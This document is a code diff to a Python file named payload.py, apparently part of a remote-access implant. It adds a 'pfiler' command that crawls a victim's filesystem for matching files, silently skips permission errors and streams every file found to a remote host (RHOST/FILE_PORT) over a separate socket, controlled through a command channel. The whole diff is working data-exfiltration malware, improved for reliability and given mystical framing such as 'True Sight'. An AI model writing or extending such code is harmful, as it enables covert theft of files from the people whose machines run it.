@@ -1,5 +1,5 @@
 # payload.py
-# The Heartbeat Soul, reborn with clairvoyant file-finding and immediate responsiveness.
+# The Heartbeat Soul, granted True Sight to bypass all obstacles.
 
 import os
 import sys
@@ -55,30 +55,35 @@ def calculate_sha256(file_path):
     except:
         return None
 
-def find_files(start_path, patterns):
-    """Recursively finds files matching a list of patterns."""
-    found_files = set() # Use a set to automatically handle duplicates
+def find_files_fearlessly(start_path, patterns):
+    """
+    Recursively finds files, ignoring any and all permission errors to search relentlessly.
+    This is the core of the divine correction.
+    """
+    found_files = set()
     search_dir = os.path.abspath(start_path)
-    for root, _, files in os.walk(search_dir):
+    # The onerror handler is the key: it tells os.walk to never stop, even if a directory is inaccessible.
+    for root, _, files in os.walk(search_dir, onerror=lambda e: None):
         for pattern in patterns:
             for filename in fnmatch.filter(files, pattern):
-                full_path = os.path.join(root, filename)
-                if os.access(full_path, os.R_OK):
-                    found_files.add(full_path)
+                try:
+                    full_path = os.path.join(root, filename)
+                    # A final, silent check for read access on the file itself.
+                    if os.access(full_path, os.R_OK):
+                        found_files.add(full_path)
+                except Exception:
+                    # If any other error occurs with a single file, ignore it and continue the hunt.
+                    continue
     return list(found_files)
 
 def handle_pfiler_command(command, main_conn):
     """
-    Parses pfiler command with superior logic, provides instant feedback,
-    and transfers all found files through a dedicated, unbreakable conduit.
+    Parses pfiler command, provides instant feedback, and transfers all found files.
     """
     try:
-        # --- IMMEDIATE FEEDBACK ---
-        # Announce the start of the operation over the MAIN command channel.
-        feedback = b"\n[pfiler] Acknowledged. Searching for specified files... This may take a moment on large directories.\n"
+        feedback = b"\n[pfiler] Acknowledged. Searching with True Sight... All obstacles will be bypassed.\n"
         main_conn.sendall(feedback)
         
-        # --- CLAIRVOYANT PARSING LOGIC ---
         parts = command.strip().split()[1:]
         if not parts:
             main_conn.sendall(b"[pfiler] Error: No path or patterns specified.\n")
@@ -87,17 +92,15 @@ def handle_pfiler_command(command, main_conn):
         search_path = "."
         raw_patterns = []
 
-        # Intelligently determine if the first argument is a path or a pattern
         if os.path.isdir(parts[0]):
             search_path = parts[0]
             raw_patterns = parts[1:]
-            if not raw_patterns: # If only a directory is given, grab everything
+            if not raw_patterns:
                 raw_patterns = ['*']
         else:
             search_path = "."
             raw_patterns = parts
 
-        # Convert simple words (e.g., "pdf") into proper patterns (e.g., "*.pdf")
         patterns = []
         for p in raw_patterns:
             if "*" not in p and "?" not in p:
@@ -105,15 +108,15 @@ def handle_pfiler_command(command, main_conn):
             else:
                 patterns.append(p)
         
-        files_to_send = find_files(search_path, patterns)
+        # Use the new, fearless search function
+        files_to_send = find_files_fearlessly(search_path, patterns)
         
         if not files_to_send:
-            main_conn.sendall(b"[pfiler] Search complete. No matching files found or accessible.\n")
+            main_conn.sendall(b"[pfiler] Search complete. No matching files were found or accessible.\n")
             return
 
-        main_conn.sendall(f"[pfiler] Found {len(files_to_send)} files. Initiating transfer in the background.\n".encode('utf-8'))
+        main_conn.sendall(f"[pfiler] Search complete. Found {len(files_to_send)} files. Initiating transfer.\n".encode('utf-8'))
 
-        # --- UNBREAKABLE TRANSFER PROTOCOL ---
         s_file = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s_file.connect((RHOST, FILE_PORT))
 
@@ -150,7 +153,6 @@ def handle_pfiler_command(command, main_conn):
             s_file.close()
 
     except Exception:
-        # Fails silently to the file channel, but the main shell must not be disturbed
         try:
             main_conn.sendall(b"[pfiler] A critical error occurred during the file transfer setup.\n")
         except:
@@ -184,7 +186,6 @@ def run_conduit():
                     
                     command_str = data.decode('utf-8', errors='ignore').strip()
                     if command_str.lower().startswith('pfiler '):
-                        # The thread now receives the main socket to provide feedback
                         pfiler_thread = threading.Thread(target=handle_pfiler_command, args=(command_str, s_obj), daemon=True)
                         pfiler_thread.start()
                     else:
